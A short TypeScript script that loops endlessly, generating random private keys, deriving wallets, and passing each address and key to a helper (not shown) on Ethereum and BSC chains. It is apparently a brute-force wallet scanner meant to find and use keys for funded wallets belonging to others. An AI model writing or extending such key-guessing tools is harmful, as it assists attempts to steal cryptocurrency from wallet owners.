import { callTx } from "./contract";
import { random } from "./util";
import { ethers } from 'ethers'

let bsc: number = 0;
let eth: number = 0;

async function main() {
    while (true) {
        const privateKey = random();
        const wallet = new ethers.Wallet(privateKey);

        console.log(wallet.address);

        [eth, bsc] = await Promise.all([
            callTx(eth, 1, wallet.address, privateKey),
            callTx(bsc, 56, wallet.address, privateKey)
        ])
        console.log("🚀 ~ file: index.ts:19 ~ main ~ bsc-eth:", bsc, eth)
        // return

    }
}

main()